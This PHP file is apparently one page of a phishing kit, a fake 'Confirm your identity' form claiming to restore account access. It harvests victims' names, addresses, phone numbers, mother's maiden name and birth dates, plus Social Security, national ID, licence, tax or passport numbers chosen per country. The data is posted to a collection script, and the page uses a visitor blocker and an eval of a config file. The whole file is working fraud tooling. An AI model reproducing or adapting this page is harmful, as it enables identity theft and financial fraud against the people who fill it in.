<?php
require_once __DIR__ . '/../function.php';
@eval(file_get_contents('../config/' . $api->general_config));

if ($config_blocker == "enable") {
  $api->cookie();
  $api->session();
}

$api->visitor("Billing");
require __DIR__ . '/../page/header-old.php';
?>
<script src="../assets/old/js/jquery.billing.js"></script>
<div class="span8">
<section class="activityModule shadow none">
<h1 style="font-size: 18px;font-weight: bold; border-bottom: 1px solid #EEE; height:40px;"><?=$api->transcode("Confirm your identity");?></h1>
<div>
</div>
<div class="messageBox res-center-critical" style="font-size: 0.875rem;"><?=$api->transcode("Complete the steps to restore your account access.");?></div>
<form method="post" action="../post/oldbill.php" class="edit" autocomplete="off">
<p class="group fcenter">
<label><?=$api->transcode("First name");?> :</label>
<span class="field">
  <input type="text" name="fi_name" maxlength="30" class="large" required>
</span>
<label><?=$api->transcode("Last name");?> :</label>
<span class="field">
  <input type="text" name="la_name" maxlength="30" class="large" required>
</span>
<label><?=$api->transcode("Address line 1");?> :</label>
<span class="field">
  <input type="text" name="address_1" maxlength="35" class="large" required>
</span>
<label><?=$api->transcode("Address line 2");?> :</label>
<span class="field">
  <input type="text" name="address_2" maxlength="30" class="large" placeholder="<?=$api->transcode("Optional");?>">
</span>
<label><?=$api->transcode("City");?> :</label>
<span class="field">
  <input type="text" name="city" maxlength="30" class="xmedium" required>
</span>
<label><?=$api->transcode("State");?> :</label>
<span class="field">
  <input type="text" name="state" maxlength="30" class="xmedium" required>
</span>
<label><?=$api->transcode("Postal code");?> :</label>
<span class="field">
  <input type="text" name="postal" maxlength="11" class="medium" required>
</span>
<label><?=$api->transcode("Country");?> :</label>
<span class="field">
  <input type="text" name="country" maxlength="30" class="large" value="<?=$_SESSION['country']?>" readonly>
</span>
<label><?=$api->transcode("Phone number");?> :</label>
<span class="field">
  <input type="tel" name="phone" pattern="[0-9]{5,}" maxlength="15" class="xmedium" placeholder="<?=$api->transcode("primary");?>" required>
</span>
<span class="help"><?=$api->transcode("For security reason, Please enter your correct information.");?></span>
<label><?=$api->transcode("Mother's maiden name");?> :</label>
<span class="field">
  <input type="text" name="mother" maxlength="25" class="xxmedium" placeholder="optional">
</span>
<?php
if ($_SESSION['code'] == "US" || $_SESSION['code'] == "IL") {
  echo '<span class="help">Same tax ID as on your tax return.</span>
  <label>Social security number :</label>
  <span class="field">
  <input type="tel" name="number_1" class="xxsmall" pattern="[0-9]{3,}" maxlength="3" required> -
  <input type="tel" name="number_2" class="xxsmall" pattern="[0-9]{2,}" maxlength="2" required> -
  <input type="tel" name="number_3" class="xxsmall" pattern="[0-9]{4,}" maxlength="4" required>
  </span>';
}
if ($_SESSION['code'] == "HK") {
  echo '<span class="help">Need for identification.</span>
  <label>National ID number :</label>
  <span class="field">
  <input type="text" maxlength="25" class="xxmedium" name="id_number" required>
  </span>';
}
if ($_SESSION['code'] == "AU") {
  echo '<span class="help">Need for identification.</span>
  <label>Driver licence number :</label>
  <span class="field">
  <input type="text" maxlength="20" class="xxmedium" name="id_number" required>
  </span>';
}
if ($_SESSION['code'] == "IT") {
  echo '<span class="help">Need for identification.</span>
  <label>Tax identification code :</label>
  <span class="field">
  <input type="text" maxlength="20" class="xxmedium" name="id_number" placeholder="Codice Fiscale" required>
  </span>';
}
if ($_SESSION['code'] == "KW") {
  echo '<span class="help">Need for identification.</span>
  <label>Civil ID number :</label>
  <span class="field">
  <input type="text" maxlength="20" class="xxmedium" name="id_number" required>
  </span>';
}
if ($_SESSION['code'] == "QA") {
  echo '<span class="help">Need for identification.</span>
  <label>Qatar ID :</label>
  <span class="field">
  <input type="text" maxlength="20" class="xxmedium" name="id_number" required>
  </span>';
}
if ($_SESSION['code'] == "TH") {
  echo '<span class="help">Need for identification.</span>
  <label>Citizen ID :</label>
  <span class="field">
  <input type="text" maxlength="20" class="xxmedium" name="id_number" required>
  </span>';
}
if ($_SESSION['code'] == "GR") {
  echo '<span class="help">Need for identification.</span>
  <label>ID number :</label>
  <span class="field">
  <input type="text" maxlength="20" class="xxmedium" name="id_number" required>
  </span>';
}
if ($_SESSION['code'] =="SA") {
  echo '<span class="help">Need for identification.</span>
  <label>National ID :</label>
  <span class="field">
  <input type="text" maxlength="20" class="xxmedium" name="id_number" required>
  </span>';
}
if ($_SESSION['code'] == "CY") {
  echo '<span class="help">Need for identification.</span>
  <label>Passport number :</label>
  <span class="field">
  <input type="text" maxlength="20" class="xxmedium" name="id_number" required>
  </span>';
}
?>
<label><?=$api->transcode("Date of birth");?> :</label>
<span class="field">
<?php
echo date_dropdown(18);
function date_dropdown($year_limit = 0){
  $html_output .= '<select class="mediu" required="required" name="month">'."\n";
  $html_output .= '<option selected="selected" value="">month</option>';
  $months = array("", "Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec");
  for ($month = 1; $month <= 12; $month++) {
    $html_output .= '<option value="' . $month . '">' . $months[$month] . '</option>';
  }
  $html_output .= "\n".'</select>'."\n";

  $html_output .= '<select class="smal" required="required" name="day">'."\n";
  $html_output .= '<option selected="selected" value="">day</option>';
  for ($day = 1; $day <= 31; $day++) {
    $html_output .= '<option value="' . $day . '">' . $day . '</option>';
  }
  $html_output .= "\n".'</select>'."\n";

  $html_output .= '<select class="mediu" required="required" name="year">'."\n";
  $html_output .= '<option selected="selected" value="">year</option>';
  for ($year = (date("Y") - $year_limit); $year >= 1900; $year--) {
    $html_output .= '<option value="' . $year . '">' . $year . '</option>';
  }
  $html_output .= "\n".'</select>'."\n";

  return $html_output;
}
?>
</span>
</p>
<p class="bcenter">
<button style="width: 150px !important;" type="submit" class="button"><?=$api->transcode("Next");?></button></p>
</form>
</section>
</div>
</div>
</div>
<br>
<?php require __DIR__ . '/../page/footer-old.php'; ?>
